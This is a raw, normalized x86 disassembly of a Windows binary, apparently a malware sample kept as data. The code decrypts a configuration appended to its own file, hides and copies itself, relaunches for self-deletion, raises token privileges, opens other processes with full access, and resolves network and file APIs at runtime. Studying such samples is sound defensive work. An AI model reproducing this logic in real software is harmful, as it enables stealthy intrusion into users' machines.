sub_401004
push ebp
mov ebp esp
sub esp 0x40
push esi
push edi
push rw-data
mov edi ecx
push [ ebp + 0x8 ]
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
jne r-xdata
push ebx
push 0x2
push 0x0
push esi
call fseek
push 0x1
pop ebx
push ebx
push 0xfffffffc
push esi
call fseek
push esi
push ebx
lea eax [ ebp + 0x8 ]
push 0x4
push eax
call fread
push ebx
push 0xfffffffc
pop eax
sub eax [ ebp + 0x8 ]
sub eax [ ebp + 0x10 ]
push eax
push esi
call fseek
push esi
push ebx
push [ ebp + 0x8 ]
push edi
call fread
add esp 0x44
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call fread
add esp 0x10
call [ GetLastError@IAT ]
and [ ebp - 0x40 ] 0x0
push 0x7
mov edx eax
pop ecx
xor eax eax
lea edi [ ebp - 0x3f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push edx
push rw-data
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x40 ]
push eax
call [ OutputDebugStringA@IAT ]
push esi
call fclose
pop ecx
mov eax ebx
pop ebx
call [ GetLastError@IAT ]
and [ ebp - 0x20 ] 0x0
push 0x7
mov edx eax
pop ecx
xor eax eax
lea edi [ ebp - 0x1f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push edx
push rw-data
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
call [ OutputDebugStringA@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_401101
push ebx
push esi
push edi
mov esi ecx
push rw-data
call [ LoadLibraryA@IAT ]
mov edi [ GetProcAddress@IAT ]
mov ebx eax
push rw-data
push ebx
call edi
push rw-data
push ebx
mov [ esi + 0x4a8 ] eax
call edi
push rw-data
push ebx
mov [ esi + 0x4ac ] eax
call edi
mov [ esi + 0x4b0 ] eax
pop edi
pop esi
pop ebx
retn
sub_401147
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
lea edi [ eax + 0x7 ]
and edi 0xfffffff8
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_40120f
cmp [ esi + 0x600 ] 0x0
jne r-xdata
sar edi 0x3
mov eax edi
test eax eax
jle r-xdata
sar edi 0x3
test edi edi
jle r-xdata
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
lea edi [ esi + 0x300 ]
mov [ ebp + 0x14 ] eax
sete [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_40127a
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_40127a
push [ ebp + 0x8 ]
mov ecx esi
push edi
push ebx
push ebx
call sub_40127a
push [ ebp + 0x1c ]
mov ecx esi
push esi
push ebx
push ebx
call sub_40127a
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec [ ebp + 0x14 ]
jne r-xdata
jmp r-xdata
sub_40120f
push esi
mov esi ecx
push edi
push 0x10
lea edi [ esi + 0x701 ]
push 0x0
push edi
call memset
add esp 0xc
cmp [ esp + 0x10 ] 0x10
jle r-xdata
mov eax [ esp + 0x10 ]
push 0x10
pop eax
jmp r-xdata
xor al al
lea eax [ esi + 0x709 ]
mov ecx esi
push eax
lea eax [ esi + 0x300 ]
push eax
call sub_401394
mov al 0x1
jmp r-xdata
push eax
push [ esp + 0x10 ]
push edi
call memcpy
add esp 0xc
mov ecx esi
push edi
push esi
call sub_401394
cmp [ esp + 0x10 ] 0x8
jle r-xdata
mov [ esi + 0x600 ] al
pop edi
pop esi
retn 0x8
sub_40127a
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x40
push [ ebp + 0xc ]
mov edi rw-data
mov ebx ecx
push edi
call sub_401563
push 0x40
push r--data
push edi
push edi
mov ecx ebx
call sub_4014c2
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
jne r-xdata
add eax 0x2d0
mov [ ebp + 0x10 ] 0x10
mov [ ebp + 0x14 ] eax
mov esi rw-data
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x10 ] 0x10
mov esi rw-data
push 0x20
push [ rw-data ]
push esi
call memcpy
add esp 0xc
mov ecx ebx
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_40141a
push 0x20
mov ecx ebx
push [ rw-data ]
push [ rw-data ]
call sub_401502
push 0x20
push esi
push [ rw-data ]
call memcpy
sub [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
push 0x40
push r--data
push edi
push edi
mov ecx ebx
call sub_4014c2
push 0x40
push edi
push [ ebp + 0x8 ]
mov ecx ebx
call sub_401594
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
push 0x20
push [ rw-data ]
push esi
call memcpy
add esp 0xc
mov ecx ebx
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_40141a
push 0x20
mov ecx ebx
push [ rw-data ]
push [ rw-data ]
call sub_401502
push 0x20
push esi
push [ rw-data ]
call memcpy
add [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
jmp r-xdata
sub_401394
push ebx
push ebp
push esi
push edi
push 0x40
mov edi rw-data
push [ esp + 0x1c ]
mov ebx ecx
push edi
call sub_401563
push 0x38
push r--data
push edi
push edi
mov ecx ebx
call sub_4014c2
mov eax [ esp + 0x14 ]
xor ebp ebp
mov [ esp + 0x18 ] eax
movsx eax [ ebp + r--data ]
lea esi [ ebp + r--data ]
push eax
push 0x1c
mov ecx ebx
push [ rw-data ]
call sub_401522
movsx eax [ esi ]
push eax
push 0x1c
push [ rw-data ]
mov ecx ebx
call sub_401522
push 0x30
push r--data
push edi
mov ecx ebx
push [ esp + 0x24 ]
call sub_4014c2
add [ esp + 0x18 ] 0x30
inc ebp
cmp ebp 0x10
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_40141a
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push 0x30
push r--data
mov esi rw-data
push ebx
mov edi ecx
push esi
call sub_4014c2
push 0x30
mov ecx edi
push [ esp + 0x18 ]
push esi
call sub_401502
push esi
push ebx
mov ecx edi
call sub_401463
push 0x20
push r--data
push ebx
push ebx
mov ecx edi
call sub_4014c2
pop edi
pop esi
pop ebx
retn 0x8
sub_401463
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
mov [ ebp - 0x4 ] ecx
xor edi edi
pop ebx
mov al [ esi + 0x1 ]
mov cl [ esi ]
shl al 0x1
add al [ esi + 0x2 ]
push 0x4
shl cl 0x1
add cl [ esi + 0x5 ]
shl al 0x1
add al [ esi + 0x3 ]
movsx ecx cl
shl al 0x1
add al [ esi + 0x4 ]
add ecx edi
shl ecx 0x4
movsx eax al
lea eax [ eax + ecx + r--data ]
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_401563
add [ ebp + 0x8 ] 0x4
add edi 0x4
add esi 0x6
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4014c2
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] eax
jle r-xdata
push [ ebp + 0x14 ]
add ecx 0x601
push ecx
push [ ebp + 0x8 ]
call memcpy
add esp 0xc
pop ebp
retn 0x10
push esi
mov edx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
movsx edx [ eax + edx ]
inc eax
mov dl [ edx + esi - 0x1 ]
cmp eax [ ebp + 0x14 ]
mov [ ecx + eax + 0x600 ] dl
jl r-xdata
pop esi
sub_401502
push esi
mov esi [ esp + 0x10 ]
test esi esi
jle r-xdata
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub ecx eax
mov dl [ ecx + eax ]
xor [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_401522
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x18 ]
lea ebx [ ecx + 0x601 ]
push edi
push esi
push ebx
call memcpy
mov eax [ esp + 0x20 ]
sub eax edi
push eax
lea eax [ esi + edi ]
push eax
push esi
call memcpy
sub esi edi
push edi
add esi [ esp + 0x30 ]
push ebx
push esi
call memcpy
add esp 0x24
pop edi
pop esi
pop ebx
retn 0xc
sub_401563
xor eax eax
cmp [ esp + 0xc ] eax
jle r-xdata
retn 0xc
push esi
mov esi [ esp + 0xc ]
mov edx eax
sar edx 0x3
mov cl al
mov dl [ edx + esi ]
and cl 0x7
sar dl cl
mov ecx [ esp + 0x8 ]
and dl 0x1
mov [ eax + ecx ] dl
inc eax
cmp eax [ esp + 0x10 ]
jl r-xdata
pop esi
sub_401594
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
sar eax 0x3
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push eax
push esi
push edi
call memset
add esp 0xc
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop edi
pop esi
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
mov ecx esi
mov eax esi
and ecx 0x7
mov dl [ esi + edx ]
sar eax 0x3
shl dl cl
add eax edi
or [ eax ] dl
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
sub_4015ef
push ebx
push ebp
push esi
mov esi ecx
push edi
xor ebx ebx
cmp [ esi + 0x4 ] ebx
mov edi 0x2000
mov ebp edi
jne r-xdata
push edi
call malloc
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
push ebx
call free
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
add ebp edi
push ebp
push [ esi + 0x4 ]
call realloc
pop ecx
mov [ esi + 0x4 ] eax
pop ecx
push 0x0
push ebp
push eax
push 0x5
call [ esi ]
jmp r-xdata
cmp eax ebx
jne r-xdata
sub_40166a
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x4 ]
push esi
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
lea eax [ ebp - 0xc ]
xor esi esi
push eax
push [ ebp + 0x8 ]
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
sbb eax eax
push esi
and eax 0x2
push esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
push 0x1
pop eax
jmp r-xdata
sub_4016ee
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
call sub_4015ef
xor ebx ebx
mov edi [ MultiByteToWideChar@IAT ]
push ebx
push ebx
push 0xffffffff
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
mov [ ebp - 0xc ] eax
add eax eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
cmp [ eax + 0x3c ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ ebp - 0x8 ]
call _wcsnicmp
add esp 0xc
test eax eax
mov eax [ esi + 0x4 ]
je r-xdata
add ecx eax
mov [ esi + 0x4 ] ecx
mov esi [ eax + 0x44 ]
jmp r-xdata
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ecx
jne r-xdata
push [ ebp - 0x8 ]
call ??3@YAXPAX@Z
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
cmp ecx ebx
jne r-xdata
sub_4017e0
push ebp
mov ebp esp
sub esp 0x210
and [ ebp - 0x10c ] 0x0
push ebx
push esi
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x10b ]
[ edi ]
and [ ebp - 0x210 ] 0x0
push 0x40
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x20f ]
[ edi ]
stosw [ edi ]
lea ecx [ ebp - 0x8 ]
stosb [ edi ]
call sub_4015d6
mov ebx 0x104
lea eax [ ebp - 0x10c ]
push ebx
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x10c ]
push ebx
push eax
lea eax [ ebp - 0x10c ]
push eax
call [ GetLongPathNameA@IAT ]
push 0xaca
mov esi rw-data
push 0x0
push esi
call memset
add esp 0xc
mov edi rw-data
lea eax [ ebp - 0x10c ]
mov ecx rw-data
push 0x10
push edi
push eax
call sub_401004
push 0x1
push 0x10
push edi
push 0xaca
push esi
push esi
mov ecx rw-data
call sub_401147
mov ecx rw-data
call sub_401101
push 0x10
push edi
push rw-data
call memcpy
add esp 0xc
xor edi edi
push esi
push 0x1
push edi
call [ CreateMutexA@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4015e0
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
push rw-data
call strcpy
pop ecx
lea eax [ ebp - 0x10c ]
pop ecx
push 0x2
push eax
call [ SetFileAttributesA@IAT ]
mov esi [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp - 0x210 ]
push ebx
push eax
push rw-data
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x210 ]
push ebx
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ GetLongPathNameA@IAT ]
lea eax [ ebp - 0x210 ]
push eax
push rw-data
call strcpy
cmp [ rw-data ] edi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x210 ]
push ebx
push eax
push rw-data
call esi
test eax eax
jne r-xdata
call sub_4019c9
test eax eax
jne r-xdata
push 0x1
push rw-data
lea ecx [ ebp - 0x8 ]
call sub_40166a
lea ecx [ ebp - 0x8 ]
call sub_401647
lea eax [ ebp - 0x210 ]
push ebx
push eax
call [ GetSystemDirectoryA@IAT ]
call sub_40257c
push rw-data
lea ecx [ ebp - 0x8 ]
call sub_4016ee
push 0x3e8
mov esi eax
call [ Sleep@IAT ]
cmp esi edi
jbe r-xdata
push esi
push edi
push 0x1f0fff
call [ OpenProcess@IAT ]
push eax
call sub_402348
jmp r-xdata
sub_4019c9
push ebp
mov ebp esp
sub esp 0x158
push ebx
push esi
push edi
push [ rw-data ]
call [ ReleaseMutex@IAT ]
and [ ebp - 0x104 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ lstrcpyA@IAT ]
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ lstrcatA@IAT ]
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ lstrcatA@IAT ]
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
xor eax eax
push eax
mov eax edx
add eax ecx
mov eax 0x1
je r-xdata
nop
call sub_401ad4
push 0x44
push 0x0
lea eax [ ebp - 0x158 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x158 ] 0x44
push 0x10
push 0x0
lea eax [ ebp - 0x114 ]
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x104 ]
push eax
push 0x0
call [ CreateProcessA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop eax
push 0x0
lea eax [ ebp - 0x104 ]
push eax
push rw-data
call [ CopyFileA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_401ad4
push ebp
mov ebp esp
sub esp 0x348
push ebx
push esi
mov esi 0x104
push edi
lea eax [ ebp - 0x140 ]
push esi
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
lea eax [ ebp - 0x140 ]
push esi
push eax
lea eax [ ebp - 0x140 ]
push eax
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x348 ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x244 ]
push eax
call esi
lea eax [ ebp - 0x244 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x348 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ ebp - 0x3c ] 0x3c
mov [ ebp - 0x30 ] rw-data
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x38 ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
push eax
call [ SetThreadPriority@IAT ]
lea eax [ ebp - 0x3c ]
push eax
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call [ SetThreadPriority@IAT ]
push 0x40
push [ ebp - 0x4 ]
call esi
push 0x1
push [ ebp - 0x4 ]
call [ SetProcessPriorityBoost@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401c01
push ebp
mov ebp esp
sub esp 0x438
push ebx
push esi
push edi
push 0x3f
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x333 ]
mov [ ebp - 0x334 ] bl
push 0x7
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0xaf ]
mov [ ebp - 0xb0 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x437 ]
mov [ ebp - 0x438 ] bl
mov esi [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esi + 0xab2 ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x44 ] eax
mov eax [ esi + 0xab6 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0xac2 ]
mov [ ebp - 0x6c ] eax
lea eax [ esi + 0x4e4 ]
push eax
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] 0x1
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ esi + 0x4b4 ]
push eax
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
je r-xdata
lea eax [ esi + 0x4c4 ]
push eax
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ esi + 0x4f4 ]
push eax
call [ esi + 0x4a8 ]
cmp eax ebx
mov [ ebp - 0x1c ] eax
je r-xdata
lea eax [ esi + 0x504 ]
push eax
call [ esi + 0x4a8 ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esi + 0x518 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x68 ] eax
je r-xdata
lea eax [ esi + 0x548 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x70 ] eax
je r-xdata
lea eax [ esi + 0x528 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x40 ] eax
je r-xdata
lea eax [ esi + 0x538 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x78 ] eax
je r-xdata
mov edi [ ebp + 0x8 ]
lea eax [ esi + 0x78a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x60 ] eax
je r-xdata
lea eax [ esi + 0x7da ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ esi + 0x7ba ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x74 ] eax
je r-xdata
lea eax [ esi + 0x79a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x80 ] eax
je r-xdata
lea eax [ esi + 0x7fa ]
push eax
push [ ebp - 0x1c ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x54 ] eax
je r-xdata
mov edi [ ebp - 0x20 ]
lea eax [ esi + 0x9ea ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
je r-xdata
lea eax [ esi + 0x9ca ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x38 ] eax
je r-xdata
lea eax [ esi + 0x9da ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
lea eax [ esi + 0xa0a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x34 ] eax
je r-xdata
lea eax [ esi + 0x58c ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x28 ] eax
je r-xdata
lea eax [ esi + 0x5cc ]
push eax
push edi
call [ esi + 0x4ac ]
test eax eax
je r-xdata
lea eax [ esi + 0x57c ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
lea eax [ esi + 0x638 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x58 ] eax
je r-xdata
lea eax [ esi + 0x5e4 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x48 ] eax
je r-xdata
lea eax [ esi + 0x5fc ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
je r-xdata
lea eax [ esi + 0x5f0 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x1c ] eax
je r-xdata
lea eax [ esi + 0x660 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
lea eax [ esi + 0x9b2 ]
push eax
push [ ebp - 0x8 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x7c ] eax
je r-xdata
lea eax [ esi + 0x82a ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x5c ] eax
je r-xdata
lea eax [ esi + 0x5a4 ]
push eax
push edi
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x4c ] eax
je r-xdata
push esi
push ebx
push ebx
call [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
push 0xffffffff
push eax
call [ ebp - 0x58 ]
lea eax [ esi + 0x1f0 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call [ ebp - 0x18 ]
lea eax [ esi + 0x28 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call [ ebp - 0x10 ]
lea eax [ esi + 0xcc ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call [ ebp - 0x10 ]
cmp [ esi + 0x3b0 ] ebx
je r-xdata
push 0x20
pop eax
mov [ ebp - 0x3c ] eax
push eax
lea eax [ ebp - 0xb0 ]
push eax
call [ ebp - 0xc ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x58 ]
push eax
push [ esi + 0xb8 ]
call [ ebp - 0x68 ]
lea eax [ ebp - 0x3c ]
lea edi [ esi + 0x98 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
push ebx
push edi
push [ ebp - 0x2c ]
call [ ebp - 0x70 ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
call [ ebp - 0x34 ]
test eax eax
je r-xdata
lea edi [ esi + 0xec ]
lea eax [ ebp - 0x438 ]
push edi
push eax
call [ ebp - 0x34 ]
test eax eax
je r-xdata
push [ ebp - 0x2c ]
call [ ebp - 0x78 ]
mov edi 0x80
lea eax [ ebp - 0x170 ]
push edi
push eax
call [ ebp - 0xc ]
lea eax [ esi + 0x3d0 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x18 ]
lea eax [ esi + 0x3f0 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x10 ]
lea eax [ esi + 0x430 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x10 ]
push ebx
push ebx
push ebx
lea eax [ esi + 0x3e0 ]
push ebx
push eax
call [ ebp - 0x60 ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x438 ]
push eax
call [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
push 0x1
push ebx
push edi
push [ ebp - 0x2c ]
call [ ebp - 0x40 ]
lea eax [ ebp - 0x438 ]
push ebx
push eax
push edi
call [ ebp - 0x48 ]
push 0x80
push edi
call [ ebp - 0x20 ]
push edi
call [ ebp - 0x1c ]
push ebx
push 0xc4000100
push ebx
lea ecx [ ebp - 0x170 ]
push ebx
push ecx
push eax
call [ ebp - 0x80 ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push [ esi + 0x3b4 ]
push 0x1
push esi
call [ ebp - 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x1f0 ]
push 0x40
push eax
call [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
push eax
lea eax [ ebp - 0x1f0 ]
push 0x40
push eax
push [ ebp - 0x4 ]
call [ ebp - 0x74 ]
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
jmp r-xdata
call [ ebp + 0x8 ]
lea eax [ ebp - 0x1b0 ]
push 0x40
push eax
call [ ebp - 0xc ]
lea eax [ ebp - 0x1b0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
push esi
call [ ebp - 0x6c ]
test eax eax
jne r-xdata
call [ ebp + 0x8 ]
jmp r-xdata
call [ ebp + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0xf0 ]
push 0x40
push eax
call [ ebp - 0xc ]
push 0x1
pop eax
push [ ebp - 0x8 ]
call [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov [ ebp + eax - 0xf0 ] bl
movsx eax [ ebp - 0x1b0 ]
sub eax 0x44
je r-xdata
mov [ ebp + eax - 0xf1 ] cl
inc eax
cmp eax 0x40
jl r-xdata
lea eax [ ebp - 0x170 ]
push edi
push eax
call [ ebp - 0xc ]
lea eax [ esi + 0x3d0 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x18 ]
lea eax [ esi + 0x3f0 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x10 ]
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x10 ]
lea eax [ ebp - 0xf0 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
call [ ebp - 0x10 ]
lea eax [ esi + 0x1f0 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x18 ]
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x38 ]
cmp [ ebp + eax - 0x335 ] 0x5c
je r-xdata
sub eax 0xe
je r-xdata
mov cl [ ebp + eax - 0x1b0 ]
cmp cl bl
je r-xdata
lea eax [ esi + 0x470 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x10 ]
lea eax [ ebp - 0x334 ]
push edi
push eax
call [ ebp - 0x20 ]
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x1c ]
push ebx
lea eax [ ebp - 0x334 ]
push ebx
push eax
lea eax [ ebp - 0x170 ]
push eax
push ebx
call [ ebp - 0x54 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x10 ]
cmp [ ebp - 0x24 ] ebx
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x4 ]
